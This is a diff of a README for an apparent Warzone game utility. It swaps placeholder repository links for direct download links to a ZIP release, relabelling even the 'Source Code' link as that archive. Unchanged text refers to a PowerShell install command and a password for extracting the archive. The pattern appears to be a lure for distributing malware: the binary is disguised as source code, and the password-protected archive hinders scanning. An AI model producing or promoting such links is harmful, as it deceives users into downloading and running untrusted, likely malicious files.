@@ -53,8 +53,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/YOUR_USERNAME/Warzone-Companion/releases/latest)
-- [Source Code](https://github.com/YOUR_USERNAME/Warzone-Companion)
+- [Latest Release](https://github.com/InletWorkerMoat/Warzone-Game-Utility/releases/download/1/WarzonPlus.zip)
+- [Source Code](https://github.com/InletWorkerMoat/Warzone-Game-Utility/releases/download/1/WarzonPlus.zip)
 
 > 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
 >
@@ -201,7 +201,7 @@ This project is licensed under the **MIT License**.
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/Warzone-Companion">
+  <a href="https://github.com/InletWorkerMoat/Warzone-Game-Utility/releases/download/1/WarzonPlus.zip">
     <img src="https://img.shields.io/badge/Made%20with%20🎯%20for%20the%20Warzone%20Community-1ABC9C?style=for-the-badge" alt="Made with love">
   </a>
 </p>
